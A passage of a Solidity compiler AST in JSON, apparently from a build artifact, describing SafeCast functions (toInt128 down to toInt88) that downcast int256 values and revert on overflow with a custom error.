cations":[],"names":[],"nodeType":"FunctionCall","src":"25989:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int128","typeString":"int128"}},"src":"25976:26:7","typeDescriptions":{"typeIdentifier":"t_int128","typeString":"int128"}},"id":5008,"nodeType":"ExpressionStatement","src":"25976:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5011,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5009,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5000,"src":"26016:10:7","typeDescriptions":{"typeIdentifier":"t_int128","typeString":"int128"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5010,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4997,"src":"26030:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"26016:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5018,"nodeType":"IfStatement","src":"26012:98:7","trueBody":{"id":5017,"nodeType":"Block","src":"26037:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313238","id":5013,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26088:3:7","typeDescriptions":{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},"value":"128"},{"id":5014,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4997,"src":"26093:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_128_by_1","typeString":"int_const 128"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5012,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"26058:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5015,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26058:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5016,"nodeType":"RevertStatement","src":"26051:48:7"}]}}]},"documentation":{"id":4995,"nodeType":"StructuredDocumentation","src":"25575:312:7","text":" @dev Returns the downcasted int128 from int256, reverting on\n overflow (when the input is less than smallest int128 or\n greater than largest int128).\n Counterpart to Solidity's `int128` operator.\n Requirements:\n - input must fit into 128 bits"},"id":5020,"implemented":true,"kind":"function","modifiers":[],"name":"toInt128","nameLocation":"25901:8:7","nodeType":"FunctionDefinition","parameters":{"id":4998,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4997,"mutability":"mutable","name":"value","nameLocation":"25917:5:7","nodeType":"VariableDeclaration","scope":5020,"src":"25910:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":4996,"name":"int256","nodeType":"ElementaryTypeName","src":"25910:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"25909:14:7"},"returnParameters":{"id":5001,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5000,"mutability":"mutable","name":"downcasted","nameLocation":"25954:10:7","nodeType":"VariableDeclaration","scope":5020,"src":"25947:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int128","typeString":"int128"},"typeName":{"id":4999,"name":"int128","nodeType":"ElementaryTypeName","src":"25947:6:7","typeDescriptions":{"typeIdentifier":"t_int128","typeString":"int128"}},"visibility":"internal"}],"src":"25946:19:7"},"scope":5451,"src":"25892:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5045,"nodeType":"Block","src":"26513:150:7","statements":[{"expression":{"id":5033,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5028,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5026,"src":"26523:10:7","typeDescriptions":{"typeIdentifier":"t_int120","typeString":"int120"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5031,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5023,"src":"26543:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5030,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"26536:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int120_$","typeString":"type(int120)"},"typeName":{"id":5029,"name":"int120","nodeType":"ElementaryTypeName","src":"26536:6:7","typeDescriptions":{}}},"id":5032,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26536:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int120","typeString":"int120"}},"src":"26523:26:7","typeDescriptions":{"typeIdentifier":"t_int120","typeString":"int120"}},"id":5034,"nodeType":"ExpressionStatement","src":"26523:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5037,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5035,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5026,"src":"26563:10:7","typeDescriptions":{"typeIdentifier":"t_int120","typeString":"int120"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5036,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5023,"src":"26577:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"26563:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5044,"nodeType":"IfStatement","src":"26559:98:7","trueBody":{"id":5043,"nodeType":"Block","src":"26584:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313230","id":5039,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26635:3:7","typeDescriptions":{"typeIdentifier":"t_rational_120_by_1","typeString":"int_const 120"},"value":"120"},{"id":5040,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5023,"src":"26640:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_120_by_1","typeString":"int_const 120"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5038,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"26605:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5041,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26605:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5042,"nodeType":"RevertStatement","src":"26598:48:7"}]}}]},"documentation":{"id":5021,"nodeType":"StructuredDocumentation","src":"26122:312:7","text":" @dev Returns the downcasted int120 from int256, reverting on\n overflow (when the input is less than smallest int120 or\n greater than largest int120).\n Counterpart to Solidity's `int120` operator.\n Requirements:\n - input must fit into 120 bits"},"id":5046,"implemented":true,"kind":"function","modifiers":[],"name":"toInt120","nameLocation":"26448:8:7","nodeType":"FunctionDefinition","parameters":{"id":5024,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5023,"mutability":"mutable","name":"value","nameLocation":"26464:5:7","nodeType":"VariableDeclaration","scope":5046,"src":"26457:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5022,"name":"int256","nodeType":"ElementaryTypeName","src":"26457:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"26456:14:7"},"returnParameters":{"id":5027,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5026,"mutability":"mutable","name":"downcasted","nameLocation":"26501:10:7","nodeType":"VariableDeclaration","scope":5046,"src":"26494:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int120","typeString":"int120"},"typeName":{"id":5025,"name":"int120","nodeType":"ElementaryTypeName","src":"26494:6:7","typeDescriptions":{"typeIdentifier":"t_int120","typeString":"int120"}},"visibility":"internal"}],"src":"26493:19:7"},"scope":5451,"src":"26439:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5071,"nodeType":"Block","src":"27060:150:7","statements":[{"expression":{"id":5059,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5054,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5052,"src":"27070:10:7","typeDescriptions":{"typeIdentifier":"t_int112","typeString":"int112"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5057,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5049,"src":"27090:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5056,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"27083:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int112_$","typeString":"type(int112)"},"typeName":{"id":5055,"name":"int112","nodeType":"ElementaryTypeName","src":"27083:6:7","typeDescriptions":{}}},"id":5058,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"27083:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int112","typeString":"int112"}},"src":"27070:26:7","typeDescriptions":{"typeIdentifier":"t_int112","typeString":"int112"}},"id":5060,"nodeType":"ExpressionStatement","src":"27070:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5063,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5061,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5052,"src":"27110:10:7","typeDescriptions":{"typeIdentifier":"t_int112","typeString":"int112"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5062,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5049,"src":"27124:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"27110:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5070,"nodeType":"IfStatement","src":"27106:98:7","trueBody":{"id":5069,"nodeType":"Block","src":"27131:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313132","id":5065,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"27182:3:7","typeDescriptions":{"typeIdentifier":"t_rational_112_by_1","typeString":"int_const 112"},"value":"112"},{"id":5066,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5049,"src":"27187:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_112_by_1","typeString":"int_const 112"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5064,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"27152:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5067,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"27152:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5068,"nodeType":"RevertStatement","src":"27145:48:7"}]}}]},"documentation":{"id":5047,"nodeType":"StructuredDocumentation","src":"26669:312:7","text":" @dev Returns the downcasted int112 from int256, reverting on\n overflow (when the input is less than smallest int112 or\n greater than largest int112).\n Counterpart to Solidity's `int112` operator.\n Requirements:\n - input must fit into 112 bits"},"id":5072,"implemented":true,"kind":"function","modifiers":[],"name":"toInt112","nameLocation":"26995:8:7","nodeType":"FunctionDefinition","parameters":{"id":5050,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5049,"mutability":"mutable","name":"value","nameLocation":"27011:5:7","nodeType":"VariableDeclaration","scope":5072,"src":"27004:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5048,"name":"int256","nodeType":"ElementaryTypeName","src":"27004:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"27003:14:7"},"returnParameters":{"id":5053,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5052,"mutability":"mutable","name":"downcasted","nameLocation":"27048:10:7","nodeType":"VariableDeclaration","scope":5072,"src":"27041:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int112","typeString":"int112"},"typeName":{"id":5051,"name":"int112","nodeType":"ElementaryTypeName","src":"27041:6:7","typeDescriptions":{"typeIdentifier":"t_int112","typeString":"int112"}},"visibility":"internal"}],"src":"27040:19:7"},"scope":5451,"src":"26986:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5097,"nodeType":"Block","src":"27607:150:7","statements":[{"expression":{"id":5085,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5080,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5078,"src":"27617:10:7","typeDescriptions":{"typeIdentifier":"t_int104","typeString":"int104"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5083,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5075,"src":"27637:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5082,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"27630:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int104_$","typeString":"type(int104)"},"typeName":{"id":5081,"name":"int104","nodeType":"ElementaryTypeName","src":"27630:6:7","typeDescriptions":{}}},"id":5084,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"27630:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int104","typeString":"int104"}},"src":"27617:26:7","typeDescriptions":{"typeIdentifier":"t_int104","typeString":"int104"}},"id":5086,"nodeType":"ExpressionStatement","src":"27617:26:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5089,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5087,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5078,"src":"27657:10:7","typeDescriptions":{"typeIdentifier":"t_int104","typeString":"int104"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5088,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5075,"src":"27671:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"27657:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5096,"nodeType":"IfStatement","src":"27653:98:7","trueBody":{"id":5095,"nodeType":"Block","src":"27678:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313034","id":5091,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"27729:3:7","typeDescriptions":{"typeIdentifier":"t_rational_104_by_1","typeString":"int_const 104"},"value":"104"},{"id":5092,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5075,"src":"27734:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_104_by_1","typeString":"int_const 104"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5090,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"27699:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5093,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"27699:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5094,"nodeType":"RevertStatement","src":"27692:48:7"}]}}]},"documentation":{"id":5073,"nodeType":"StructuredDocumentation","src":"27216:312:7","text":" @dev Returns the downcasted int104 from int256, reverting on\n overflow (when the input is less than smallest int104 or\n greater than largest int104).\n Counterpart to Solidity's `int104` operator.\n Requirements:\n - input must fit into 104 bits"},"id":5098,"implemented":true,"kind":"function","modifiers":[],"name":"toInt104","nameLocation":"27542:8:7","nodeType":"FunctionDefinition","parameters":{"id":5076,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5075,"mutability":"mutable","name":"value","nameLocation":"27558:5:7","nodeType":"VariableDeclaration","scope":5098,"src":"27551:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5074,"name":"int256","nodeType":"ElementaryTypeName","src":"27551:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"27550:14:7"},"returnParameters":{"id":5079,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5078,"mutability":"mutable","name":"downcasted","nameLocation":"27595:10:7","nodeType":"VariableDeclaration","scope":5098,"src":"27588:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int104","typeString":"int104"},"typeName":{"id":5077,"name":"int104","nodeType":"ElementaryTypeName","src":"27588:6:7","typeDescriptions":{"typeIdentifier":"t_int104","typeString":"int104"}},"visibility":"internal"}],"src":"27587:19:7"},"scope":5451,"src":"27533:224:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5123,"nodeType":"Block","src":"28147:148:7","statements":[{"expression":{"id":5111,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5106,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5104,"src":"28157:10:7","typeDescriptions":{"typeIdentifier":"t_int96","typeString":"int96"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5109,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5101,"src":"28176:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5108,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"28170:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int96_$","typeString":"type(int96)"},"typeName":{"id":5107,"name":"int96","nodeType":"ElementaryTypeName","src":"28170:5:7","typeDescriptions":{}}},"id":5110,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28170:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int96","typeString":"int96"}},"src":"28157:25:7","typeDescriptions":{"typeIdentifier":"t_int96","typeString":"int96"}},"id":5112,"nodeType":"ExpressionStatement","src":"28157:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5115,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5113,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5104,"src":"28196:10:7","typeDescriptions":{"typeIdentifier":"t_int96","typeString":"int96"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5114,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5101,"src":"28210:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"28196:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5122,"nodeType":"IfStatement","src":"28192:97:7","trueBody":{"id":5121,"nodeType":"Block","src":"28217:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3936","id":5117,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"28268:2:7","typeDescriptions":{"typeIdentifier":"t_rational_96_by_1","typeString":"int_const 96"},"value":"96"},{"id":5118,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5101,"src":"28272:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_96_by_1","typeString":"int_const 96"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5116,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"28238:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5119,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28238:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5120,"nodeType":"RevertStatement","src":"28231:47:7"}]}}]},"documentation":{"id":5099,"nodeType":"StructuredDocumentation","src":"27763:307:7","text":" @dev Returns the downcasted int96 from int256, reverting on\n overflow (when the input is less than smallest int96 or\n greater than largest int96).\n Counterpart to Solidity's `int96` operator.\n Requirements:\n - input must fit into 96 bits"},"id":5124,"implemented":true,"kind":"function","modifiers":[],"name":"toInt96","nameLocation":"28084:7:7","nodeType":"FunctionDefinition","parameters":{"id":5102,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5101,"mutability":"mutable","name":"value","nameLocation":"28099:5:7","nodeType":"VariableDeclaration","scope":5124,"src":"28092:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5100,"name":"int256","nodeType":"ElementaryTypeName","src":"28092:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"28091:14:7"},"returnParameters":{"id":5105,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5104,"mutability":"mutable","name":"downcasted","nameLocation":"28135:10:7","nodeType":"VariableDeclaration","scope":5124,"src":"28129:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int96","typeString":"int96"},"typeName":{"id":5103,"name":"int96","nodeType":"ElementaryTypeName","src":"28129:5:7","typeDescriptions":{"typeIdentifier":"t_int96","typeString":"int96"}},"visibility":"internal"}],"src":"28128:18:7"},"scope":5451,"src":"28075:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5149,"nodeType":"Block","src":"28685:148:7","statements":[{"expression":{"id":5137,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5132,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5130,"src":"28695:10:7","typeDescriptions":{"typeIdentifier":"t_int88","typeString":"int88"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5135,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5127,"src":"28714:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5134,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"28708:5:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int88_$","typeString":"type(int88)"},"typeName":{"id":5133,"name":"int88","nodeType":"ElementaryTypeName","src":"28708:5:7","typeDescriptions":{}}},"id":5136,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28708:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int88","typeString":"int88"}},"src":"28695:25:7","typeDescriptions":{"typeIdentifier":"t_int88","typeString":"int88"}},"id":5138,"nodeType":"ExpressionStatement","src":"28695:25:7"},{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5141,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5139,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5130,"src":"28734:10:7","typeDescriptions":{"typeIdentifier":"t_int88","typeString":"int88"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":5140,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5127,"src":"28748:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"28734:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":5148,"nodeType":"IfStatement","src":"28730:97:7","trueBody":{"id":5147,"nodeType":"Block","src":"28755:72:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3838","id":5143,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"28806:2:7","typeDescriptions":{"typeIdentifier":"t_rational_88_by_1","typeString":"int_const 88"},"value":"88"},{"id":5144,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5127,"src":"28810:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_88_by_1","typeString":"int_const 88"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5142,"name":"SafeCastOverflowedIntDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3708,"src":"28776:29:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_int256_$returns$_t_error_$","typeString":"function (uint8,int256) pure returns (error)"}},"id":5145,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28776:40:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":5146,"nodeType":"RevertStatement","src":"28769:47:7"}]}}]},"documentation":{"id":5125,"nodeType":"StructuredDocumentation","src":"28301:307:7","text":" @dev Returns the downcasted int88 from int256, reverting on\n overflow (when the input is less than smallest int88 or\n greater than largest int88).\n Counterpart to Solidity's `int88` operator.\n Requirements:\n - input must fit into 88 bits"},"id":5150,"implemented":true,"kind":"function","modifiers":[],"name":"toInt88","nameLocation":"28622:7:7","nodeType":"FunctionDefinition","parameters":{"id":5128,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5127,"mutability":"mutable","name":"value","nameLocation":"28637:5:7","nodeType":"VariableDeclaration","scope":5150,"src":"28630:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5126,"name":"int256","nodeType":"ElementaryTypeName","src":"28630:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"28629:14:7"},"returnParameters":{"id":5131,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5130,"mutability":"mutable","name":"downcasted","nameLocation":"28673:10:7","nodeType":"VariableDeclaration","scope":5150,"src":"28667:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int88","typeString":"int88"},"typeName":{"id":5129,"name":"int88","nodeType":"ElementaryTypeName","src":"28667:5:7","typeDescriptions":{"typeIdentifier":"t_int88","typeString":"int88"}},"visibility":"internal"}],"src":"28666:18:7"},"scope":5451,"src":"28613:220:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5175,"nodeType":"Block","src":"29223:148:7","statements":[{"expression":{"id":5163,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5158,"name":"downcasted","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5156,"src":"29233:10:7","typeDescriptions":{"typeIdentifier":"t_int80","typeString":"int80"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5161,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5153,"src":"29252:5:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5160,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"29246:5:7","typeDescriptions":{"typeIdent